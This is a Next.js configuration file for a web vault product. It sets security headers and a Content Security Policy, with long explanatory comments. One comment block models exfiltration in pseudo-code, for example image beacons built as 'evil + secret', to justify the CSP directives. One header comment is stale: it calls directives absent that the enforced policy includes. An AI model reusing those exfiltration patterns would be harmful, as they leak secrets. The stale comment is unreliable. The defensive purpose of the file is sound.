/** @type {import('next').NextConfig} */

/**
 * The deployment's original vercel.app hostname, which stayed live and fully
 * functional after the custom domain landed — including a working owner sign-in.
 *
 * That is worse than an untidy leftover. Relay's own emails were once found
 * pointing at this host, and the fix was written up as a security matter: a raw
 * vercel.app address carrying a token in the query string, arriving during an
 * emergency, is indistinguishable from phishing. Leaving a second place where
 * credentials are genuinely accepted teaches exactly the habit the product
 * needs people not to have.
 *
 * Only this exact host redirects. Preview deployments get their own generated
 * hostnames and must keep working, or every PR becomes unreviewable.
 */
const LEGACY_HOST = 'relay-three-henna.vercel.app';

/*
  ── THE CONTENT SECURITY POLICY, IN TWO VERSIONS ──────────────────────────────

  🔴 WHY THE ORIGINAL SEQUENCE CHANGED ON 2026-08-20. The plan was to observe
  report-only traffic and then decide. That plan could not execute: reports went
  to stderr and nowhere else, and Vercel runtime log retention measured about 24
  HOURS — a 7-day query and a 24-hour query returned identical counts, and
  /api/csp-report did not appear among the 29 retained request paths at all. The
  evidence expired before anyone could read it, so "wait for evidence" had become
  "wait forever" while the header cost bytes on every response.

  ⚠️ AND THE COST OF WAITING WAS UNDERSTATED. The note this replaced said that
  enforcing while 'unsafe-inline' remains "would buy very little". For a product
  that decrypts vault plaintext IN THE BROWSER, the threat is not a script
  running — it is a script SENDING WHAT IT FOUND somewhere. 'unsafe-inline'
  concedes the first; connect-src, img-src and default-src close the second:

    fetch / XHR / WebSocket / sendBeacon to an attacker host  -> connect-src
    image beacon, new Image().src = evil + secret             -> img-src
    form POST to an attacker                                  -> form-action
    pulling in further attacker script                        -> default-src

  What remains is navigation (location = evil + secret), which CSP cannot stop
  and which is visible to the person sitting there. So enforcing converts SILENT
  background exfiltration into "the attacker must navigate you away in front of
  you". That is most of the practical protection, and it needed no middleware.

  Measured before switching on, because "it should be fine" is not a measurement:
  ZERO client fetch() to an external URL, ZERO third-party scripts or embeds,
  Stripe is a redirect rather than an embed, and @vercel/analytics posts
  same-origin. The app already behaved as if the policy were enforcing.

  The two versions differ in exactly one directive — script-src — and share one
  definition, because two copies of a policy is two things to drift.
*/
const CSP_SHARED = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "style-src 'self' 'unsafe-inline'",
  // data: covers the locally-generated TOTP enrolment QR, which is encoded
  // in-process precisely so the secret never reaches a third party.
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  // Stripe checkout is a REDIRECT, not an embed, so no frame-src for it.
  "connect-src 'self' https://vitals.vercel-insights.com",
];

const CSP_REPORTING = ['report-uri /api/csp-report', 'report-to csp'];

/*
  ⚠️ A CSP ERROR YOU WILL SEE IN `npm run dev`, WHICH MUST NOT BE "FIXED" HERE.

    Loading the script 'https://va.vercel-scripts.com/v1/script.debug.js'
    violates the following Content Security Policy directive: "script-src ..."

  @vercel/analytics loads its script from an EXTERNAL origin in development and
  from `/_vercel/insights/script.js` — SAME-ORIGIN — in production. Verified both
  ways on 2026-08-20: the package's own bundle contains both URLs, and
  relaystandby.com's served HTML contains no reference to va.vercel-scripts.com.

  So the obvious fix — adding va.vercel-scripts.com to script-src — would
  permanently widen PRODUCTION's policy to admit an external script origin that
  production never loads, in order to silence a console line in dev. That trades
  the actual protection for a tidier local console. Analytics simply does not
  report from `npm run dev`, which costs nothing.

  ⚠️ Note also that this violation was found by LOADING PAGES IN A BROWSER, not
  by reading the source: the script is injected at runtime by a package, so it
  appears in no grep for `<script>` or `fetch(`. The measurement that said "zero
  third-party scripts" was source-based and was wrong. Anything that changes
  these directives needs a browser, not a search.
*/

/**
 * What is actually blocked today.
 *
 * 'unsafe-inline' and 'unsafe-eval' remain because Next's bootstrap emits inline
 * scripts and removing them without nonces would blank the app. They are the
 * concession that makes this deployable now; everything else is real.
 */
const CSP_ENFORCED = [
  ...CSP_SHARED,
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  ...CSP_REPORTING,
].join('; ');

/**
 * The next rung, observed only — and now with somewhere to be observed.
 *
 * Identical except that script-src drops both escapes. Every report this
 * generates is a concrete answer to "what would break if we did the nonce work",
 * which is the one CSP question here that genuinely needs evidence rather than
 * argument. Reports land in `csp_reports` (migration 038) carrying `disposition`
 * so enforce-vs-report is never guessed at.
 *
 * ⚠️ Expect this to report on every page load at first: Next's own bootstrap is
 * exactly what it refuses. That is the measurement, not a fault — the question is
 * whether anything OTHER than Next's bootstrap appears.
 */
const CSP_REPORT_ONLY = [...CSP_SHARED, "script-src 'self'", ...CSP_REPORTING].join('; ');

/**
 * Response headers, applied to every route.
 *
 * 🔴 THERE WERE NONE AT ALL until 2026-08-13 — no headers() here, no
 * middleware.ts, nothing in vercel.json. For a product whose security model is
 * "plaintext only ever exists in the browser", the headers that constrain what
 * a browser will do with that page are not decoration; they are the second half
 * of the design.
 *
 * It began as DELIBERATELY THE FOUR THAT CANNOT BREAK A PAGE, with
 * Content-Security-Policy held back because an enforcing policy needs nonces for
 * Next's inline bootstrap scripts, which needs Node-runtime middleware on every
 * request — the change lib/http/owner-route.ts already declined to make. The
 * plan was: ship report-only, watch real traffic, decide on evidence.
 *
 * ✅ 2026-08-20: the full policy is now ENFORCED, and the nonce question moved to
 * a stricter report-only header. See CSP_ENFORCED below for why that sequence
 * changed.
 */
const SECURITY_HEADERS = [
  /*
    One year, no preload. Long enough to be meaningful, and deliberately NOT
    submitted to the preload list: preload is close to irreversible, and a
    product this young should not hand a browser a promise it cannot take back.
  */
  { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },

  /*
    The app frames nothing and is embedded nowhere. DENY rather than
    SAMEORIGIN because stand-down, cancel and release are one-click controls
    whose whole risk profile is somebody clicking them without meaning to —
    which is what clickjacking is. frame-ancestors 'none' joins this in S2b;
    both are kept because older browsers honour only the header.
  */
  { key: 'X-Frame-Options', value: 'DENY' },

  { key: 'X-Content-Type-Options', value: 'nosniff' },

  /*
    ADDED 2026-08-15, after a live header probe found six of the seven a
    production checklist asks for and this one simply absent — not argued away
    anywhere in this file, which is how a header goes missing: nobody decided
    against it, nobody thought of it.

    It severs `window.opener` between this origin and any cross-origin document
    that opened it or that it opens. On a page where vault plaintext is decrypted
    in the browser, a retained handle from another origin is the one reference
    worth cutting — and it also makes the outbound `target="_blank"` links on
    /demo and /security safe by construction rather than by remembering `rel`.

    SAFE HERE SPECIFICALLY, checked rather than assumed: nothing in this product
    depends on a popup talking back. Stripe checkout and the billing portal are
    full navigations (`window.location.href = url`), and `window.open` appears
    nowhere in src. A product that signed in through an OAuth popup could not
    take this header without breaking that flow.
  */
  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },

  /*
    Matters more here than on most sites: the unclaimed-contact fallback still
    puts ?token= in a URL, and the default policy would leak that whole URL to
    any off-site link a recipient follows from an access screen.
  */
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },

  /*
    ONLY the features nothing in this product uses. WebAuthn is gated by
    publickey-credentials-get / -create, whose default allowlist is already
    'self' — naming them here to be thorough is how a passkey sign-in gets
    broken by a header nobody suspects. Omission is the safer instruction.
  */
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },

  /*
    CONTENT-SECURITY-POLICY, ENFORCING — but only the directives that cannot
    blank a page.

    🔴 SHIPPING EVERYTHING REPORT-ONLY WAS COSTING PROTECTION THAT WAS FREE,
    found by the 2026-08-13 release audit. The argument below for report-only is
    entirely correct about `script-src`, and entirely irrelevant to the four
    directives here — none of which has anything to do with Next's inline
    bootstrap, and none of which can stop a page rendering:

      base-uri       a <base> tag injected into a page can silently repoint
                     every relative URL on it. Nothing in this product emits
                     one, so 'self' costs nothing and closes the whole class.
      object-src     no <object>/<embed> anywhere; 'none' is free.
      frame-ancestors  already enforced by X-Frame-Options: DENY above, which
                     has been live and breaking nothing. This is the same
                     instruction in the form newer browsers read.
      form-action    every form in the app is an onSubmit handler with no
                     `action` attribute, verified before enforcing; Stripe
                     checkout is a redirect, not a cross-origin POST.

    WHAT IS DELIBERATELY ABSENT: default-src, script-src, style-src, img-src,
    connect-src and font-src. An omitted directive is not enforced at all, so
    this header restricts scripts and network access exactly as much as no
    header does — which is the point. Those stay in the report-only policy
    below until real traffic says what they would break.

    A test pins the split in both directions: this header must exist, and it
    must never grow a directive that can blank a screen.
  */
  {
    key: 'Content-Security-Policy',
    value: CSP_ENFORCED,
  },

  /*
    REPORT-ONLY, NOW POINTED AT THE NEXT RUNG RATHER THAN AT THIS ONE.

    Until 2026-08-20 this header carried the SAME policy as the enforcing one,
    which meant it could only ever report things that were already permitted —
    it was observing a question nobody was asking. It now carries script-src
    without 'unsafe-inline'/'unsafe-eval', so every report is a concrete answer
    to the one CSP question here that genuinely needs evidence: what would break
    if the nonce/middleware work were done.

    Report-only still cannot break a page by construction, which is why the
    stricter version is safe to ship the moment the safer version is enforced.

    ⚠️ Reports now PERSIST (migration 038, lib/ops/csp-report-store.ts). Before
    this they went to stderr, and Vercel keeps runtime logs about a day — so the
    observation period that justified this header could never conclude. A
    report-only header whose reports expire is a header that informs nothing.

    frame-ancestors IS meaningful even here — it duplicates X-Frame-Options
    above, which is deliberate: the header is what older browsers honour, and
    this is what newer ones do.
  */
  {
    key: 'Content-Security-Policy-Report-Only',
    value: CSP_REPORT_ONLY,
  },

  /*
    The modern half of reporting. `report-uri` is deprecated but still the only
    thing several browsers implement; `report-to` needs this companion header to
    name the group. Both ship, because collecting from only some browsers looks
    identical to a clean policy.
  */
  { key: 'Reporting-Endpoints', value: 'csp="/api/csp-report"' },
];

const nextConfig = {
  async headers() {
    return [
      { source: '/:path*', headers: SECURITY_HEADERS },
      /*
        Static art and the guide's screenshots. Without this they are served
        with no freshness at all, so every open of /guide revalidates 26 PNGs
        and a 3 MB PDF — mostly by the audience on the oldest phones.

        A DAY, NOT `immutable`. These files are edited in place (the guide was
        reshot twice this week; the SVGs four times); a year-long immutable
        cache would pin returning visitors to whichever version they saw first.
        One day of quiet plus a week of stale-while-revalidate keeps repeat
        opens instant and lets an edit propagate within a day, which matches how
        often these actually change.
      */
      {
        source: '/assets/:path*',
        headers: [
          { key: 'Cache-Control', value: 'public, max-age=86400, stale-while-revalidate=604800' },
        ],
      },
      /*
        Screens and the PDF only — deliberately NOT /guide/:path*. That pattern
        would catch index.html, and the guide's WORDS must be able to correct
        themselves same-day (they carry the product's promises; one was
        corrected this very week). Pictures can lag a day; sentences cannot.
      */
      {
        source: '/guide/screens/:path*',
        headers: [
          { key: 'Cache-Control', value: 'public, max-age=86400, stale-while-revalidate=604800' },
        ],
      },
      {
        source: '/guide/relay-guide.pdf',
        headers: [
          { key: 'Cache-Control', value: 'public, max-age=86400, stale-while-revalidate=604800' },
        ],
      },
    ];
  },

  /**
   * 🔴 THE USER'S GUIDE WAS WRITTEN AND NEVER SHIPPED, found by the pre-release
   * audit on 2026-08-13. Forty-two sections covering setup, the day it matters
   * and what to do when something goes wrong — sitting in `docs/`, with no
   * public directory, no route and no link. A test
   * (lib/billing/beta-flag.test.ts) was already guarding a promise made in §2.7
   * of a document no user could open.
   *
   * The file now lives at `public/guide/index.html` and is the ONLY copy: the
   * served artifact and the one the test reads are the same bytes, so the guard
   * cannot start watching a stale duplicate.
   *
   * Static assets under `public/` are served at their literal path, so
   * `/guide` alone would 404 — Next does not resolve a directory to its
   * index.html. This rewrite makes the short URL work, which matters because
   * `/guide` is what goes in an invitation email and on the help page.
   */
  async rewrites() {
    return [
      { source: '/guide', destination: '/guide/index.html' },
      /*
        The beta-test guide, same mechanism and the same reason — a directory
        does not resolve to its index.html, so without this the page 404s and
        the PDF generator prints nothing. Unlisted rather than secret: disallowed
        in robots.ts, noindexed in its own <head>, and linked from nowhere in the
        app. It exists as a served page because scripts/guide-pdf.mjs prints the
        SERVED document — the guide's images are root-absolute, and printing from
        file:// resolves them against the filesystem root and produces a PDF of
        broken images.
      */
      { source: '/guide/beta', destination: '/guide/beta/index.html' },
      { source: '/guide/beta/setup', destination: '/guide/beta/setup/index.html' },
      /*
        Browsers probe /favicon.ico by convention even when the document links an
        icon, and Next's app-router convention file is `icon.svg` — so every page
        load was producing a 404. Harmless in itself; the cost is that a log full
        of routine 404s is a log in which a real one is invisible, and this is the
        product whose incident path was built because failures were going unseen.

        A rewrite rather than a committed .ico: one icon, one source of truth. If
        it is ever redrawn, there is no second file to forget.
      */
      { source: '/favicon.ico', destination: '/icon.svg' },
    ];
  },

  async redirects() {
    return [
      {
        // "Recipients & Verifiers" and "Your circle" were two nav entries for
        // one idea, which asked an owner to know an internal distinction in
        // order to find anyone. /circle is now People and does both jobs.
        // Permanent, so bookmarks and any older emailed link move with it.
        source: '/recipients',
        destination: '/circle',
        permanent: true,
      },
      {
        source: '/:path*',
        has: [{ type: 'host', value: LEGACY_HOST }],
        destination: `https://relaystandby.com/:path*`,
        // Permanent: search engines and any inbox still holding an old link
        // should learn the real home, not keep resolving to a mirror.
        permanent: true,
      },
    ];
  },
};

export default nextConfig;
